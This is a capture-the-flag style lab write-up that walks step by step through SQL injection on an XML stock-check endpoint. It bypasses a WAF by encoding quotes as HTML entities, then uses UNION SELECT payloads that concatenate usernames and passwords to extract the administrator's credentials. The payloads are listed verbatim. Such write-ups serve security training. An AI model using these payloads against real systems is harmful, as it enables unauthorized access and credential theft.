# SQL injection with filter bypass via XML encoding

*A clean, step‑by‑step write‑up using my original flow and **raw payloads** (kept as written), with short notes on XML/HTML entities and why the bypass works.*

---

## 🎯 Goal
**Get the administrator password and log in** by bypassing a SQLi filter that inspects XML input.

---

## 🧭 Context
- The endpoint **`/product/stock`** accepts **XML** parameters (e.g., `productId`, `storeId`).  
- A basic WAF/validation layer blocks obvious meta‑characters (returns **403 “Attack detected”** for quotes/backticks).  
- Because the transport is XML, **HTML entity encoding** can help bypass naive filters — the server often **decodes entities** before building SQL.

Reference helper used: <https://mothereff.in/html-entities>

---

## ✅ My Exact Steps (verbatim, lightly corrected)

1. **GOAL:** get administrator password and log in via SQL injection filter bypass of XML.  
2. **XML ENCODING** usually means HTML entities; I used the site above to encode characters.  
3. It took a while to find the **vulnerable parameter**; I probed everywhere with a character that breaks the query.  
4. At **`/product/stock`** you can see XML entities with `productId` and `storeId`.  
5. Trying to use raw breakers: `'` / `"` / <code>`</code> → **403** response: “Attack detected”.  
6. Since it’s XML I converted the quote to an **HTML entity**: `'` → `&#x27;` → the response shows **“0 units”** (so the filter didn’t fire).  
7. I guessed the SQL shape is numeric, e.g.:  
   `SELECT productId FROM products WHERE productId = 1`  
   If I **escape into a string**, it breaks — so I pivoted to **UNION**. *(see screenshot 2)*  
8. `1 UNION SELECT 1` → shows nothing. Maybe it expects **text** → try `1 UNION SELECT '1'`. *(see screenshot 3)*  
9. Lab says: *“The database contains a `users` table with `username` and `password`.”*  
10. `1 UNION SELECT username FROM users` → **returns usernames**. *(see screenshot 4)*  
11. `1 UNION SELECT username, password FROM users` → **nothing** (only **one** column is returned).  
12. Use **string concatenation** to fit one column:  
    `1 UNION SELECT username || '/' || password FROM users`  
13. **Grab the administrator password** and log in.  
14. **Lab solved!** ✅

---

## 🧠 Why This Works (minimal notes)

- **Entity bypass in XML inputs:**  
  Filters often catch literal `'` / `"` / backticks, but **don’t normalize/resolve entities** before checking. When the backend **parses the XML**, entities like `&#x27;` become **real quotes** again, landing in the SQL layer **after** the filter — hence the bypass.

- **Column count alignment:**  
  The original query returns **one column**, so `UNION SELECT` must also return **one**. When you tried two (`username, password`), it didn’t render. Concatenating into one string (`username || '/' || password`) matches the shape.

- **Concatenation operator:**  
  The `||` operator is valid in **PostgreSQL** and **Oracle**. If the backend were **MySQL**, you’d use `CONCAT(username,'/',password)`; for **SQL Server**, `username + '/' + password`.

- **“0 units” clue:**  
  The benign response with `&#x27;` showed the request flowed through without WAF blocking — a strong hint that **entity‑decoded input** reaches the SQL sink.

> Guardrail: Always have authorization. Avoid sending production PII/creds; stick to lab data or clearly scoped tests.

---

## ⌨️ Raw payloads / inputs I used (kept exactly)

```
'  "  `          → 403 “Attack detected”
&#x27;              → “0 units” (bypass)

1 UNION SELECT 1
1 UNION SELECT '1'
1 UNION SELECT username FROM users
1 UNION SELECT username, password FROM users
1 UNION SELECT username || '/' || password FROM users
```

*(Where needed, place encoded `&#x27;` in the XML value for `productId` / `storeId` to pass the filter, then craft the UNION payload accordingly.)*

---

## 🏁 Result
- Bypassed XML/WAF checks using **HTML entity encoding**, confirmed **single‑column** rendering, concatenated creds via `||`, extracted the **administrator password**, and logged in. **Solved. ✅**
